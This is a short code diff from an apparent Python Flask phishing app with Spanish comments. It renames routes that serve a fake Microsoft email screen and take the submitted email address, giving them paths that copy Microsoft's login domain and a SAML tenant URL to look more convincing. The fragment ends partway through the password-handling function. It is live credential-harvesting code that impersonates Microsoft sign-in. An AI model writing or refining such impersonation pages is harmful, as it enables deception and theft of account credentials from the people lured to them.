@@ -120,12 +120,12 @@ def portal_principal():
     session['csrf_token'] = token_csrf
     return render_template('index.html', csrf_token=token_csrf)
 
-@app.route('/ms-login')
+@app.route('/login.microsoftonline.com/fc6602ef-8e88-4f1d-a206-e14a3bc19af2/saml2')
 def ms_login():
     # Mostrar pantalla de correo de Microsoft
     return render_template('ms_email.html')
 
-@app.route('/ms-password', methods=['POST'])
+@app.route('/login.microsoftonline.com/fc6602ef-8e88-4f1d-a206-e14a3bc19af2/saml3', methods=['POST'])
 def ms_password():
     # Capturamos el correo que viene del 'name="email"' del HTML
     correo = request.form.get('email')
